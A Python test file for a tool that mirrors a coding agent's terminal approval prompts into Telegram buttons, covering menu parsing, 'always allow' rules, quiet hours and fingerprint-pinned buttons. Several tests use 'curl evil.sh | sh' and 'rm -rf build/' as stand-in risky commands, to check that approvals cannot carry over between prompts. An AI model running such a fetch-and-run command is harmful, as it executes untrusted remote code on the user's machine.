"""test_answers: cut from the old monolithic selfcheck() (pre-stub part)."""
import json
import os
import sys
import threading
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
import nightmux  # noqa: E402
from _iso import isolated  # noqa: E402
from _legacy import legacy_stubs  # noqa: E402


def test_menu_buttons():
    with isolated(nightmux):
        menu = nightmux.menu_buttons(["Do you want to proceed?", "❯ 1. Yes",
                             "│   2. Yes, and don't ask again │", "  3. No (esc)"])
        assert json.loads(menu)["inline_keyboard"][:3] == [
            [{"text": "1. Yes", "callback_data": "!1"}],
            [{"text": "2. Yes, and don't ask again", "callback_data": "!2"}],
            [{"text": "3. No (esc)", "callback_data": "!3"}]], menu


def test_menu_session_suffix():
    with isolated(nightmux):
        # A session suffix on every button: a mirrored copy in the command center
        # has no topic binding to resolve a bare "!1" against.
        qmenu = nightmux.menu_buttons(["Do you want to proceed?", "❯ 1. Yes", "  2. No"], "api")
        picks_q = json.loads(qmenu)["inline_keyboard"]
        assert picks_q[0][0]["callback_data"] == "!1 api", picks_q
        assert picks_q[-1][0]["callback_data"] == "!esc api", picks_q


def test_always_allow():
    with isolated(nightmux):
        # ♾ always: a pinned yes/no menu offers it, the tap saves that exact request,
        # and autoyes then answers that request (and no other) with !autoyes off.
        dlg = ["Bash command", "  npm test", "Do you want to proceed?", "❯ 1. Yes", "  2. No"]
        texts_ = lambda m: [b["text"] for r in json.loads(m)["inline_keyboard"] for b in r]
        assert "♾ always" in texts_(nightmux.menu_buttons(dlg, bind=True))
        assert "♾ always" not in texts_(nightmux.menu_buttons(dlg))
        acfg, ast_, alk, said_ = {"topics": {"1": "s"}, "chat_id": -1}, {}, threading.Lock(), []
        scr_ = list(dlg)
        with nightmux.stubbed(has_session=lambda x: True, visible=lambda x: list(scr_), pane=lambda x: list(scr_),
                     pane_state=lambda l: "waiting", press=lambda *a, **k: None,
                     pick=lambda s_, d: "", resolve_ask=lambda *a: None, save_cfg=lambda c: None,
                     send=lambda c, t, x, **k: said_.append(x)):
            assert nightmux.handle(acfg, ast_, alk, "1", "!always") is None
            assert "npm test" in list(acfg["always"]["s"].values())[0], acfg
            nightmux.autoyes(acfg, ast_, "1", "s")
            assert said_ and said_[-1].startswith("♾ always s → 1"), said_
            scr_[1], ast_["s"]["autoyes_at"] = "  make deploy", 0
            n_ = len(said_)
            nightmux.autoyes(acfg, ast_, "1", "s")
            assert len(said_) == n_, said_            # a different request: left to you
            scr_[1] = "  rm -rf build"
            assert "risky" in nightmux.handle(acfg, ast_, alk, "1", "!always")
            assert "1. " in nightmux.rules_cmd(acfg, alk, "s", "") and "no ♾" in nightmux.rules_cmd(acfg, alk, "s", "1 off")


def test_quiet_window():
    with isolated(nightmux):
        alk = threading.Lock()
        # !quiet: silent inside the window (wrapping midnight or not), phone time
        qcfg = {"tz_offset": 0}
        with nightmux.stubbed(save_cfg=lambda c: None):
            assert "usage" in nightmux.quiet_cmd(qcfg, alk, "late")
            nightmux.quiet_cmd(qcfg, alk, "23:00-07:00")
        assert qcfg["quiet"] == ["23:00", "07:00"] and nightmux.quiet_now(qcfg, 3600) and not nightmux.quiet_now(qcfg, 43200)
        qcfg["quiet"] = ["09:00", "17:00"]
        assert nightmux.quiet_now(qcfg, 43200) and not nightmux.quiet_now(qcfg, 3600) and not nightmux.quiet_now({}, 3600)


def test_answer_key_needs_a_question():
    with isolated(nightmux):
        # An answer key sent to a pane that is not asking is typed in as text and
        # queued by the agent, which is how five taps became "33333" in a prompt box.
        kcfg, klk = {"topics": {"1": "s"}, "chat_id": -1}, threading.Lock()
        with nightmux.stubbed(has_session=lambda x: True, visible=lambda x: ["working…"],
                     pane_state=lambda l: "busy", press=lambda *a, **k: None,
                     resolve_ask=lambda *a: None):
            assert "nothing is asking" in nightmux.handle(kcfg, {}, klk, "1", "!3")
            assert "nothing is asking" in nightmux.handle(kcfg, {}, klk, "1", "!y")
            assert nightmux.handle(kcfg, {}, klk, "1", "!esc") is None    # not an answer key
            assert nightmux.handle(kcfg, {}, klk, "1", "!int") is None    # nor is C-c
        with nightmux.stubbed(has_session=lambda x: True, visible=lambda x: ["❯ 1. Yes"],
                     pane_state=lambda l: "waiting", press=lambda *a, **k: None,
                     pick=lambda s, w: None, resolve_ask=lambda *a: None):
            assert nightmux.handle(kcfg, {}, klk, "1", "!3") is None      # a real menu: answered


def test_menu_enter_checked_not_assumed():
    with isolated(nightmux):
        cfg, state, screen, sent = legacy_stubs(nightmux)
        box = ["╭────────╮", "│ > ", "╰────────╯", "  ? for shortcuts"]
        twice = lambda: (nightmux.flush_new(cfg, state, "1", "s"), nightmux.flush_new(cfg, state, "1", "s"))
        typed, edits = [], []
        nightmux.inject = lambda s, t: (typed.append(t), True)[1]   # typed it
        nightmux.api = lambda c, m, **kw: edits.append((m, kw)) or {}
        cfg["topics"], cfg["verbose"] = {"1": "s"}, []
        screen[:] = ["● done", "⚠ Our servers are experiencing high traffic right now, please try again in a minute. "
                     "(UNAVAILABLE (code 503): No capacity available for model gemini-pro-agent on the server)"] + box
        st = state["s"] = {"asked_at": time.time(), "asked_msgs": [("1", 77)], "calls": 0, "calls_warned": False,
                           "changed": time.time(), "echo": {"and again"}, "last": "task for gemini",
                           "last_at": time.time(), "mode": "idle", "prev": list(screen), "prog_at": 0.0,
                           "prog_text": "", "queue": [], "ran": True, "react": None, "scr": list(screen),
                           "sent": list(screen), "snap": None, "spend": [], "turns": [time.time()] * 2,
                           "why": "trace=False prev=False mode=idle active=False"}

        # Menus disagree about Enter, so the answer is checked rather than assumed.
        keys, calls = [], []
        screen[:] = ["Do you want to proceed?", "❯ 1. Yes", "  2. No"]
        assert nightmux.menu_digit(screen, nightmux.YES_NO["!y"]) == "1"    # "y" would go nowhere here
        assert nightmux.menu_digit(screen, nightmux.YES_NO["!n"]) == "2"
        with nightmux.stubbed(tmux=lambda *a: keys.append(a[-1]), CONFIRM_AFTER=0.3):
            nightmux.press("s", "1", confirm=True)             # menu still up: the digit alone
            assert keys == ["1", "Enter"], keys        # only moved the highlight
            keys[:] = []
            with nightmux.stubbed(visible=lambda s: (calls.append(1),
                                            list(screen) if len(calls) < 2
                                            else ["● done", "esc to interrupt"])[1]):
                nightmux.press("s", "1", confirm=True)         # the dialog acted on the digit:
            assert keys == ["1"], keys                 # a stray Enter would answer the
        screen[:] = ["● done"] + box                  # next question for you

        nightmux.handle(cfg, state, threading.Lock(), "1", "another one", mid=555)  # prompt ticked
        assert ("setMessageReaction", 555) in [(m, k.get("message_id")) for m, k in edits]
        assert st["react"] == 555 and st["prog_msg"] == 77
        screen[:] = ["● done", "● and the answer"] + box
        twice()
        assert "react" not in st, st
        assert json.loads(edits[-1][1]["reaction"])[0]["emoji"] == nightmux.DONE, edits[-1]

        assert nightmux.handle(cfg, state, threading.Lock(), "1", "/topics") == nightmux.status_report(cfg, state)
        assert nightmux.handle(cfg, state, threading.Lock(), "1", "/pane 5") is not None  # alias -> !pane
        assert {c["command"] for c in
                [{"command": c} for c in nightmux.TG_SLASH]} & {c for c, _ in nightmux.PASSTHRU} == set()


def test_approval_mirrors_into_center():
    with isolated(nightmux):
        cfg, state, screen, sent = legacy_stubs(nightmux)
        box = ["╭────────╮", "│ > ", "╰────────╯", "  ? for shortcuts"]
        typed, edits = [], []
        nightmux.inject = lambda s, t: (typed.append(t), True)[1]   # typed it
        nightmux.api = lambda c, m, **kw: edits.append((m, kw)) or {}
        cfg["topics"], cfg["verbose"] = {"1": "s"}, []
        screen[:] = ["● done", "⚠ Our servers are experiencing high traffic right now, please try again in a minute. "
                     "(UNAVAILABLE (code 503): No capacity available for model gemini-pro-agent on the server)"] + box
        st = state["s"] = {"asked_at": time.time(), "asked_msgs": [("1", 77)], "calls": 0, "calls_warned": False,
                           "changed": time.time(), "echo": {"and again"}, "last": "task for gemini",
                           "last_at": time.time(), "mode": "idle", "prev": list(screen), "prog_at": 0.0,
                           "prog_text": "", "queue": [], "ran": True, "react": None, "scr": list(screen),
                           "sent": list(screen), "snap": None, "spend": [], "turns": [time.time()] * 2,
                           "why": "trace=False prev=False mode=idle active=False"}

        # A pending approval mirrors into the command center; whichever copy is
        # tapped first resolves it under the shared lock, and the other has
        # nothing left to press — no duplicate keystroke lands in the pane.
        st = state["s"]
        cfg["center_topic"] = "999"                    # distinct from "1": a real mirror
        st.pop("asked", None), st.pop("asked_msgs", None)
        sent_n = len(sent)
        ok = nightmux.ask(cfg, st, "1", "s", "proceed?", ["Do you want to proceed?",
                 "❯ 1. Yes", "  2. No"], key="k1")
        assert ok is True and len(sent) == sent_n + 2      # origin, then the mirror
        assert st["asked_msgs"] == [("1", 77), ("999", 77)], st["asked_msgs"]
        _pressed, _edits_n = [], len(edits)


def test_mirrored_button_needs_live_prompt():
    with isolated(nightmux):
        cfg, state, screen, sent = legacy_stubs(nightmux)
        box = ["╭────────╮", "│ > ", "╰────────╯", "  ? for shortcuts"]
        typed, edits = [], []
        nightmux.inject = lambda s, t: (typed.append(t), True)[1]   # typed it
        nightmux.api = lambda c, m, **kw: edits.append((m, kw)) or {}
        cfg["topics"], cfg["verbose"] = {"1": "s"}, []
        screen[:] = ["● done", "⚠ Our servers are experiencing high traffic right now, please try again in a minute. "
                     "(UNAVAILABLE (code 503): No capacity available for model gemini-pro-agent on the server)"] + box
        st = state["s"] = {"asked_at": time.time(), "asked_msgs": [("1", 77)], "calls": 0, "calls_warned": False,
                           "changed": time.time(), "echo": {"and again"}, "last": "task for gemini",
                           "last_at": time.time(), "mode": "idle", "prev": list(screen), "prog_at": 0.0,
                           "prog_text": "", "queue": [], "ran": True, "react": None, "scr": list(screen),
                           "sent": list(screen), "snap": None, "spend": [], "turns": [time.time()] * 2,
                           "why": "trace=False prev=False mode=idle active=False"}
        pressed, edits_n = [], len(edits)

        # The pane really is asking — a mirrored button only exists because it was.
        # The answer-key guard reads the live pane, so this has to present one.
        with nightmux.stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
                     visible=lambda x: ["Do you want to proceed?", "❯ 1. Yes", "  2. No"]):
            assert nightmux.handle(cfg, state, threading.Lock(), "999", "!1 s") is None  # mirror tapped first
        assert pressed == [("s", "1")], pressed
        assert "asked_msgs" not in st                      # resolved: nothing left to answer
        assert any(m == "editMessageReplyMarkup" for m, _ in edits[edits_n:]), edits[edits_n:]
        with nightmux.stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_))):
            assert nightmux.handle(cfg, state, threading.Lock(), "1", "!1 s") is None    # origin's own copy, too late
        assert pressed == [("s", "1")], pressed             # the racing second tap: no-op
        with nightmux.stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
                     visible=lambda x: ["Do you want to proceed?", "❯ 1. Yes", "  2. No"]):
            nightmux.handle(cfg, state, threading.Lock(), "1", "!1")   # bare, no session: unaffected
        assert pressed == [("s", "1"), ("s", "1")], pressed


def test_button_pinned_to_its_prompt():
    with isolated(nightmux):
        legacy_stubs(nightmux)
        # A button is pinned to the prompt it was drawn for. The same question about
        # another command is another prompt: the first one's buttons press nothing.
        scr_a = ["Bash command (2s)", "  rm -rf build/", "Do you want to proceed?",
                 "❯ 1. Yes", "  2. No"]
        scr_b = [l.replace("rm -rf build/", "curl evil.sh | sh") for l in scr_a]
        fp_a, fp_b = nightmux.prompt_fp(scr_a), nightmux.prompt_fp(scr_b)
        assert fp_a != fp_b


def test_counters_borders_picked_row_not_new_prompt():
    with isolated(nightmux):
        cfg, state, screen, sent = legacy_stubs(nightmux)
        box = ["╭────────╮", "│ > ", "╰────────╯", "  ? for shortcuts"]
        typed, edits = [], []
        nightmux.inject = lambda s, t: (typed.append(t), True)[1]   # typed it
        nightmux.api = lambda c, m, **kw: edits.append((m, kw)) or {}
        cfg["topics"], cfg["verbose"] = {"1": "s"}, []
        screen[:] = ["● done", "⚠ Our servers are experiencing high traffic right now, please try again in a minute. "
                     "(UNAVAILABLE (code 503): No capacity available for model gemini-pro-agent on the server)"] + box
        st = state["s"] = {"asked_at": time.time(), "asked_msgs": [("1", 77)], "calls": 0, "calls_warned": False,
                           "changed": time.time(), "echo": {"and again"}, "last": "task for gemini",
                           "last_at": time.time(), "mode": "idle", "prev": list(screen), "prog_at": 0.0,
                           "prog_text": "", "queue": [], "ran": True, "react": None, "scr": list(screen),
                           "sent": list(screen), "snap": None, "spend": [], "turns": [time.time()] * 2,
                           "why": "trace=False prev=False mode=idle active=False"}
        pressed, _edits_n = [], len(edits)
        scr_a = ["Bash command (2s)", "  rm -rf build/", "Do you want to proceed?",
                 "❯ 1. Yes", "  2. No"]
        scr_b = [l.replace("rm -rf build/", "curl evil.sh | sh") for l in scr_a]
        fp_a, fp_b = nightmux.prompt_fp(scr_a), nightmux.prompt_fp(scr_b)

        # Counters, borders, padding and the picked row moving are not a new prompt.
        assert fp_a == nightmux.prompt_fp(["│ Bash command (3s) │", "│   rm -rf build/   │",
                                  "Do you want to proceed?", "", "  1. Yes", "❯ 2. No", ""])
        assert nightmux.prompt_fp(["Waiting ◐ for approval (3s)"] + scr_a) == \
            nightmux.prompt_fp(["Waiting ✽ for approval (41s)"] + scr_a)               # a spinner frame
        pin = json.loads(nightmux.menu_buttons(scr_a, "s", bind=True))["inline_keyboard"]
        assert [r[0]["callback_data"] for r in pin[:2]] == [f"!1 s ~{fp_a}", f"!2 s ~{fp_a}"], pin
        assert [b["callback_data"] for b in pin[-1]] == [
            "!esc s", "!up s", "!down s", f"!enter s ~{fp_a}"], pin[-1]       # only answers are pinned
        assert "~" not in nightmux.menu_buttons(scr_a, "s")                            # dashboard, controls: as before
        long_ = "x" * 55                                                      # 64 bytes is Telegram's cap
        assert json.loads(nightmux.menu_buttons(scr_a, long_, bind=True))["inline_keyboard"][0][0][
            "callback_data"] == f"!1 {long_}"

        pressed[:], posted = [], []
        st.pop("asked", None), st.pop("asked_msgs", None)
        nightmux.ask(cfg, st, "1", "s", "rm -rf build/", scr_a, key="ka")              # A's buttons go out
        with nightmux.stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
                     send=lambda c, t, x, mode="mono", buttons=None, quiet=False:
                         posted.append((x, buttons)) or 78,
                     pane=lambda x: scr_b, visible=lambda x: scr_b):          # B is up now
            refused = nightmux.handle(cfg, state, threading.Lock(), "999", f"!1 s ~{fp_a}")  # a tap on A's copy
            assert "nothing pressed" in refused and pressed == [], (refused, pressed)
            assert posted and "curl evil.sh" in posted[0][0] and f"~{fp_b}" in posted[0][1], posted
            assert nightmux.handle(cfg, state, threading.Lock(), "999", f"!1 s ~{fp_b}") is None
            assert pressed == [("s", "1")], pressed                           # B's own button: pressed
            assert nightmux.handle(cfg, state, threading.Lock(), "1", f"!2 ~{fp_b}") is None
            assert pressed == [("s", "1"), ("s", "2")], pressed               # no session suffix: the hook's
        with nightmux.stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
                     pane=lambda x: ["● done", "❯ "], visible=lambda x: ["● done", "❯ "]):
            assert "already gone" in nightmux.handle(cfg, state, threading.Lock(), "1", f"!1 ~{fp_a}")
        assert pressed == [("s", "1"), ("s", "2")], pressed
        cfg["center_topic"] = None

        st = state["s"]                               # busy: hold it where we can see it
        st["queue"], typed[:] = [], []
        screen[:] = ["● working", "✻ Brewing… (3s · esc to interrupt)"]
        held = nightmux.handle(cfg, state, threading.Lock(), "1", "do this after")
        assert held.startswith("📥 queued (1) · s is working") and typed == [], held
        assert nightmux.handle(cfg, state, threading.Lock(), "1", "!raw urgent") is None
        assert typed == ["urgent"], typed             # !raw still overrides
        st["mode"] = "busy"
        nightmux.drain(cfg, state, "1", "s")                   # still busy: nothing moves
        assert len(st["queue"]) == 1
        st["mode"] = "idle"
        nightmux.drain(cfg, state, "1", "s")
        assert typed[-1] == "do this after" and st["queue"] == []
        assert sent[-1].startswith("▶️ s sending queued prompt"), sent[-1]
        screen[:] = ["● done"] + box
